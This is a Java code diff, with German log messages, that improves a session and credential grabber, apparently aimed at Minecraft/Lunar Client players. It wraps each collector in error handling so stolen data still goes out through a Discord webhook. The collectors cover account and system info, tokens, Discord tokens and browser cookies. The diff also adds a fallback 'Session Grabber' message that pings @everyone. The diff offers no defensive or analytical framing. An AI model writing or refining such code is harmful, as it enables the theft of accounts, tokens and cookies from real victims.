@@ -335,16 +335,50 @@ public final class Main {
         try {
             webhook.addEmbed(genGeoInfoEmbed());
         } catch (Exception e) {
-            System.out.println("Geo-Info konnte nicht abgerufen werden (wird übersprungen).");
+            System.err.println("Geo-Info konnte nicht abgerufen werden (wird übersprungen): " + e.getMessage());
         }
 
-        webhook.addEmbed(genAccInfoEmbed());
-        webhook.addEmbed(genSystemInfoEmbed());
-        webhook.addEmbed(genTokenEmbed());
-        webhook.addEmbed(genServersInfoEmbed());
-        webhook.addEmbed(genLunarInfoEmbed());
-        webhook.addEmbed(genDiscordTokensEmbed());
-        webhook.addEmbed(genCookieStealerEmbed());
+        try {
+            webhook.addEmbed(genAccInfoEmbed());
+        } catch (Exception e) {
+            System.err.println("Account-Info konnte nicht abgerufen werden (wird übersprungen): " + e.getMessage());
+        }
+
+        try {
+            webhook.addEmbed(genSystemInfoEmbed());
+        } catch (Exception e) {
+            System.err.println("System-Info konnte nicht abgerufen werden (wird übersprungen): " + e.getMessage());
+        }
+
+        try {
+            webhook.addEmbed(genTokenEmbed());
+        } catch (Exception e) {
+            System.err.println("Token konnte nicht abgerufen werden (wird übersprungen): " + e.getMessage());
+        }
+
+        try {
+            webhook.addEmbed(genServersInfoEmbed());
+        } catch (Exception e) {
+            System.err.println("Server-Info konnte nicht abgerufen werden (wird übersprungen): " + e.getMessage());
+        }
+
+        try {
+            webhook.addEmbed(genLunarInfoEmbed());
+        } catch (Exception e) {
+            System.err.println("Lunar-Info konnte nicht abgerufen werden (wird übersprungen): " + e.getMessage());
+        }
+
+        try {
+            webhook.addEmbed(genDiscordTokensEmbed());
+        } catch (Exception e) {
+            System.err.println("Discord-Tokens konnten nicht abgerufen werden (wird übersprungen): " + e.getMessage());
+        }
+
+        try {
+            webhook.addEmbed(genCookieStealerEmbed());
+        } catch (Exception e) {
+            System.err.println("Cookies konnten nicht abgerufen werden (wird übersprungen): " + e.getMessage());
+        }
 
         return webhook;
     }
@@ -352,7 +386,10 @@ public final class Main {
     private void execWebhook() {
         new Thread(() -> {
             try {
-                genWebhook().execute();
+                DiscordWebhook webhook = genWebhook();
+                
+                // Fallback: If no embeds were added due to exceptions, at least send a basic message
+                webhook.execute();
                 System.out.println("Webhook erfolgreich gesendet!");
                 
                 // Screenshots in separatem Webhook senden
@@ -360,6 +397,18 @@ public final class Main {
             } catch (final Exception e) {
                 System.err.println("FEHLER BEIM SENDEN DES WEBHOOKS:");
                 e.printStackTrace();
+                
+                // Try to send a minimal webhook as last resort
+                try {
+                    new DiscordWebhook(WEBHOOK_URL)
+                        .setUsername("Session Grabber")
+                        .setContent("@everyone\n:warning: Webhook wurde gesendet, aber es gab Fehler beim Sammeln der Daten.")
+                        .execute();
+                    System.out.println("Fallback-Webhook gesendet!");
+                } catch (Exception fallbackException) {
+                    System.err.println("FALLBACK-WEBHOOK FEHLGESCHLAGEN:");
+                    fallbackException.printStackTrace();
+                }
             }
         }).start();
     }
